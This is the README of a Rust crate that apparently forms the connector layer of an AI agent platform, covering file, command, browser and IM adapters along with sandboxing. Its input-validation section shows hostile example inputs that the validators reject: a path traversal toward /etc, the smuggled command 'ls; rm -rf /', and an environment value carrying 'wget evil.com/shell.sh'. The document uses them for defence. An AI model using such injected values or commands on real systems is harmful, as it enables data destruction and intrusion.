# cyberclaw-connectors

- Status: Active
- Scope: Crate
- Owner: CyberClaw Maintainers
- Last Updated: 2026-04-14

Connector 实现与能力分发。

## 概述

`cyberclaw-connectors` 提供 CyberClaw 平台的 Connector 层实现，负责将抽象能力转换为具体执行：

- **LocalConnector**: 本地文件系统、命令执行、搜索能力
- **BrowserConnector**: 附着到现有 Chrome/Chromium DevTools endpoint，提供 CDP 浏览器自动化能力
- **CapabilityDispatcher**: 能力路由与分发
- **Runtime Isolation**: 运行时隔离与安全执行

## 架构

```
Agent -> Skill -> Connector -> Capability
                     ↓
              Runtime Selection
                ↓       ↓       ↓
             Native  Process  Container
```

## LocalConnector 能力

### 文件系统 (fs)
- `fs.read`: 读取文件
- `fs.write`: 写入文件
- `fs.edit`: 编辑文件

### 搜索 (search)
- `search.grep`: 内容搜索
- `search.glob`: 文件名匹配

### 命令执行 (cmd)
- `cmd.exec`: 执行命令

## Browser CDP Connector 能力

`BrowserConnector` 是 opt-in Connector，附着到已有 Chrome/Chromium DevTools
endpoint，不负责安装、启动或托管浏览器进程。服务端设置
`CYBERCLAW_BROWSER_ENABLED=true` 后注册为 `browser` connector。

环境变量：

- `CYBERCLAW_BROWSER_ENABLED=true`: 启用服务端注册
- `CYBERCLAW_BROWSER_WS_URL`: 直接指定 page WebSocket URL
- `CYBERCLAW_BROWSER_DEBUG_URL`: DevTools HTTP endpoint，默认 `http://127.0.0.1:9222`
- `CYBERCLAW_BROWSER_TIMEOUT_MS`: CDP 请求/事件等待超时，默认 30000

能力：

- `browser.navigate`: 导航到 HTTP/HTTPS URL
- `browser.click`: 通过 CSS selector 点击元素
- `browser.fill`: 通过 CSS selector 填写文本
- `browser.evaluate`: 在页面上下文执行 JavaScript
- `browser.screenshot`: 截图并写入 workspace 内路径
- `browser.dialog_handle`: 接受或拒绝 JavaScript dialog

安全边界：

- 所有 `browser.*` 能力均为 `RiskLevel::High`
- effects 为 Read + Write + Network + Execute
- 截图输出路径限制在 workspace 内
- 浏览器进程生命周期、Camoufox/fingerprint-evasion 模式属于外部运行时配置，不在该 Connector 内托管

### 宿主工具兼容能力 (host)
- `host.agent.run`: 宿主会话代理执行
  - `command` 模式: 真实走 `cmd.exec` 执行
  - `message` 模式: 记录/分发会话消息（`message-dispatch`）
- `host.skill.invoke`: 真实加载并调用 Skill Handler（`UnifiedSkillLoader + SkillRuntime`）
  - 支持按 `skill_name` 自动发现目录（workspace/ecosystem/.codex）
  - 支持 `inspect` 只读检查模式（不调用 handler）
  - 能力契约为 `RiskLevel::Medium`，`effects = [Read, Execute]`
- 其余 `host.*`（plan/worktree/task/team/todo/cron/lsp/repl/remote-trigger 等）均通过 `LocalConnector` 统一调度

## 新增模块 (2026-03-21)

### Runtime 模块

实现进程级运行时隔离：

- **ProcessExecutor** (`runtime::process`): 进程隔离执行
  - 命令白名单
  - 超时控制 (300s 默认)
  - SIGTERM/SIGKILL 升级终止
  - 环境隔离
  - stdout/stderr 捕获

- **RuntimeSelector** (`runtime::selector`): 运行时选择策略
  - 基于 RiskLevel 的自动选择
  - Low → Native (无隔离)
  - Medium → Process (进程隔离)
  - High/Critical → Container (完全隔离)

- **RuntimeMode** (`runtime::mode`): 运行时模式枚举

**默认安全模型**: Default-Deny (空白名单 = 拒绝所有命令)

**测试**: 43 个 connector 测试通过

## 使用示例

```rust
use cyberclaw_connectors::{LocalConnector, CapabilityDispatcher};
use cyberclaw_core::prelude::*;

// 创建 LocalConnector
let connector = LocalConnector::new();

// 创建 dispatcher
let mut dispatcher = CapabilityDispatcher::new();
dispatcher.register_connector("local", connector);

// 执行能力
let result = dispatcher.execute(
    &ConnectorId::new("local"),
    &CapabilityId::new("fs.read"),
    serde_json::json!({"path": "/path/to/file.txt"})
).await?;
```

## 安全特性

### 进程级隔离（Process Runtime）

- 命令白名单验证
- 进程超时保护（默认 300s）
- 环境隔离
- 危险命令拦截
- 默认拒绝策略（Default-Deny）
- SIGTERM/SIGKILL 升级终止
- stdout/stderr 安全捕获

### 容器级隔离（Container Runtime）- P2 安全加固 (2026-03-23)

#### 输入验证（SEC-001）

**文件**: `src/runtime/container.rs:182-280`

实现了 5 个严格的输入验证函数，防止命令注入攻击（OWASP A03）：

- **`validate_path()`**: 路径验证
  - 拒绝 `../` 路径遍历
  - 拒绝绝对路径
  - 拒绝 null 字节
  - 拒绝控制字符

- **`validate_env_var()`**: 环境变量验证
  - 强制 `KEY=VALUE` 格式
  - 拒绝控制字符
  - 拒绝 shell 元字符

- **`validate_image_name()`**: Docker 镜像名验证
  - 强制 `registry/repo:tag` 格式
  - 拒绝路径遍历
  - 拒绝特殊字符

- **`validate_command()`**: 命令验证
  - 拒绝 shell 元字符 (`;`, `|`, `&`, `$`, `` ` ``, `(`, `)`)
  - 防止命令链接和注入

- **`validate_args()`**: 参数数组验证
  - 单独验证每个参数
  - 防止参数注入

**示例 - 攻击被阻止**:
```rust
// ❌ 路径遍历攻击
volume_mounts: vec![("../../../etc".to_string(), "/mnt".to_string())]
// Error: Path traversal detected

// ❌ 命令注入攻击
command: Some("ls; rm -rf /".to_string())
// Error: Shell metacharacters detected

// ❌ 恶意环境变量
env_vars: vec!["PATH=/tmp; wget evil.com/shell.sh".to_string()]
// Error: Invalid environment variable format
```

#### 容器安全加固（SEC-002）

**文件**: `src/runtime/container.rs:296-299`

符合 CIS Docker Benchmark 安全基准：

- **`--read-only`**: 只读根文件系统（CIS 5.12）
- **`--security-opt no-new-privileges`**: 禁止权限提升（CIS 5.25）
- **`--cap-drop ALL`**: 移除所有 Linux Capabilities（CIS 5.3）
- **`--network none`**: 默认网络隔离（CIS 5.1）

**安全效果**:
```bash
# 容器内部无法执行的操作：
- 修改根文件系统内容（read-only）
- 通过 setuid 提权（no-new-privileges）
- 使用 CAP_NET_RAW 等危险能力（cap-drop ALL）
- 访问外部网络（network none）
```

#### 依赖安全（SEC-003/004/005）

**文件**: `Cargo.toml:29`

- **SQLx 0.7.4 → 0.8.6**: 修复 CVE-2024-45610（PostgreSQL SQL 注入）
- 同步修复 MySQL、SQLite 相关漏洞

### 测试覆盖

- ✅ **196+ 单元测试**，全部通过
- ✅ 包含 Container Runtime 所有验证函数的测试
- ✅ Process Runtime 隔离和超时测试
- ✅ Runtime Selector 策略选择测试
- ✅ IM 适配器 84 个测试（Lark 31 + WeChat 28 + Telegram 25）
- ✅ Clippy 严格模式通过（`-D warnings`）

### 安全最佳实践

1. **最小权限原则**: 默认使用最严格的隔离模式
2. **纵深防御**: 多层验证（输入 → 运行时 → 容器）
3. **默认安全**: 安全配置作为默认值，而非可选项
4. **审计追踪**: 所有执行请求都有完整日志

## IM Channel Connector

IM Channel Connector 提供统一的即时通讯平台接入层，支持语音消息、会话绑定、意图分类和驾驶安全摘要。

### 核心组件

- **ImChannelConnector**: 会话绑定管理、消息去重（FIFO 窗口）、过期清理
- **ImPlatformAdapter** trait: 各平台适配器的统一接口
- **VoiceSafeSummarizer**: 语音安全摘要（BriefStatus / CompletionSummary）
- **RuleBasedClassifier**: 基于规则的用户意图分类（ExecuteCapability / InvokeExternalAgent / Approve / Reject / AskStatus / Unclassified）

### IM 平台适配器

#### Lark / Feishu（飞书）

**文件**: `src/im_adapters/lark.rs`

双域支持，同一适配器通过 `LarkDomain::Feishu`（feishu.cn）/ `LarkDomain::Lark`（larksuite.com）切换。

- **传输模式**: WebSocket 长连接 + Webhook 双模式
- **认证**: OAuth2 tenant_access_token，5 分钟提前刷新缓存
- **事件加密**: AES-256-CBC 解密（SHA-256 密钥派生 + 手动 CBC + PKCS7）
- **消息类型**: text / command / audio / image / file / post / video / sticker / interactive
- **富文本解析**: `extract_post_text()` 多语言支持（zh_cn / en_us / ja_jp）
- **扩展 API**: `reply_text()` / `send_card()` / `update_card()` / `add_reaction()` / `upload_image()` / `upload_file()`
- **WebSocket**: 自动重连、心跳 ping/pong、优雅关闭
- **语音**: `send_voice()` / `download_voice()`（media_id 编码格式 `message_id:file_key`）
- **31 个单元测试**

#### WeChat（微信）

**文件**: `src/im_adapters/wechat.rs`

基于 iLink Bot API（`ilinkai.weixin.qq.com`）的微信 Bot 适配器。

- **传输模式**: HTTP 长轮询（`getupdates`）
- **认证**: Bearer token + iLink 专用 header（AuthorizationType / App-Id / ClientVersion / X-WECHAT-UIN）
- **会话追踪**: `context_token` per chat，errcode -14 会话过期自动重连
- **CDN 加密**: AES-128-ECB 加解密（hex / base64 密钥格式）
- **消息类型**: TEXT(1) / IMAGE(2) / VOICE(3) / FILE(4) / VIDEO(5)
- **扩展 API**: `send_typing()` 输入状态指示
- **28 个单元测试**

#### Telegram

**文件**: `src/im_adapters/telegram.rs`

标准 Telegram Bot API 适配器。

- **传输模式**: HTTP 长轮询（`getUpdates`），offset 追踪
- **消息类型**: text / command / voice / photo / document / video / sticker
- **发送 API**: `send_text()` / `send_voice()`（multipart）/ `send_photo()` / `send_document()`
- **语音下载**: `getFile` API + HTTP 下载
- **签名验证**: HMAC-SHA256
- **25 个单元测试**

### 使用示例

```rust
use cyberclaw_connectors::im_adapters::lark::{LarkAdapter, LarkConfig, LarkDomain};
use cyberclaw_connectors::im_channel::{ImChannelConnector, ImChannelConfig, ImPlatformAdapter};

// Feishu 适配器
let config = LarkConfig {
    app_id: "cli_xxx".to_string(),
    app_secret: "secret".to_string(),
    domain: LarkDomain::Feishu,
    ..Default::default()
};
let adapter = LarkAdapter::new(config);

// 标准化入站消息
let msg = adapter.normalize_inbound(raw_json).await?;

// 发送文本回复
adapter.send_text("chat_id", "任务已完成").await?;
```

## TOML 声明式过滤管线 (新增 2026-04-14)

- `toml_filter.rs`：8 阶段声明式输出过滤引擎
  - Stage 1: strip_ansi — 剥离 ANSI 转义序列
  - Stage 2: replace — 正则替换规则
  - Stage 3: match_output — 命令匹配短路
  - Stage 4: strip/keep_lines — 按正则过滤行
  - Stage 5: truncate — UTF-8 安全的逐行截断
  - Stage 6: head/tail — 首尾行提取
  - Stage 7: max_lines — 绝对行数上限
  - Stage 8: on_empty — 空输出回退文本
  - 支持 TOML 多源合并 (`from_toml_sources`)
  - 内置测试框架 (`run_tests`) 验证过滤规则
  - 16 个测试用例通过

## Agent Hook Bridge (新增 2026-04-14)

- `agent_hook_bridge.rs`：外部 AI Agent 命令拦截桥接层
  - 5 种 Agent 方言检测：Claude Code / Codex / Copilot VS Code / Copilot CLI / Cursor
  - `RewriteRegistry`：RegexSet O(1) 多模式匹配 + 命令重写路由
  - `CommandClassification`：5 级风险分类 (Safe → Critical)
  - `HookBridge::process()`：detect → classify → route 一站式处理
  - 17 条默认重写规则覆盖 git/cargo/go/npm/docker/kubectl + 危险命令
  - 16 个测试用例通过

## OpenViking Memory Connector (新增 2026-04-14)

- `openviking/`：CyberClaw 默认外部记忆层，通过 REST API 接入独立部署的 OpenViking 实例
  - AGPL 安全：纯 HTTP 客户端，无代码链接，无 Python SDK 嵌入
  - 7 个只读 Capability（Phase A）：
    - `openviking.memory.ls` / `tree` / `read` / `search` / `find` / `abstract` / `overview`
    - 全部 `RiskLevel::Low`，`CapabilityEffect::Read`
  - L0/L1/L2 语义反转：独立 `OvRetrievalDepth` 枚举，禁止复用 `MemoryLevel`
  - `OvCircuitBreaker`：Closed/Open/HalfOpen 状态机，原子操作无锁实现
  - 降级契约：熔断器打开时 fail-open 返回空结果 + `degraded_sources` 标记
  - `openviking-memory` 已加入 `PROTECTED_CONNECTOR_IDS` 防覆盖
  - 15 个测试用例通过

## 许可证

Apache-2.0
